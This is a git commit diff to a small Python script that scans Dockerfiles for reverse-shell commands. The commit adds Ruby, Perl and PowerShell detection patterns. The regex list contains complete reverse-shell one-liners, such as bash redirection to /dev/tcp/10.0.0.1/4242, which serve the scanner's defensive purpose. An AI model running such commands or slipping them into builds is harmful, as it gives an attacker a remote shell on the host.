3468c3579201a4c2eb52556603056f36cc82ee62
Batmanwholaughs <79194657+Batmanwholaughs22@users.noreply.github.com>
2023-07-09 23:34:21 +0400

    MobyDick.py

--- MobyDick.py
+++ MobyDick.py
@@ -8,7 +8,10 @@ def scan_dockerfile(dockerfile_path):
         (re.compile(r'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'), 'Bash shell'),
         (re.compile(r'0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196'), 'Shell'),
         (re.compile(r'/bin/bash -l'), 'Bash shell'),
-        (re.compile(r'php -r \$sock=fsockopen'), 'PHP shell')
+        (re.compile(r'php -r \$sock=fsockopen'), 'PHP shell'),
+        (re.compile(r'ruby .*socket\.tcp\(.*\)\.to_i'), 'Ruby shell'),
+        (re.compile(r'perl .*Socket.*connect\(.*\);'), 'Perl shell'),
+        (re.compile(r'powershell.*New-Object.*System.Net.Sockets.TCPClient'), 'PowerShell shell')
     ]
 
     with open(dockerfile_path, 'r') as dockerfile:
@@ -25,14 +28,10 @@ def scan_dockerfile(dockerfile_path):
     if not shell_found:
         print("No shells detected in the Dockerfile.")
 
-
 if len(sys.argv) < 2:
     print("Please provide the path to the Dockerfile as a command-line argument.")
     print("Example: python3 docker_scanner.py /path/to/Dockerfile")
     sys.exit(1)
 
-
 dockerfile_path = sys.argv[1]
-
-
 scan_dockerfile(dockerfile_path)
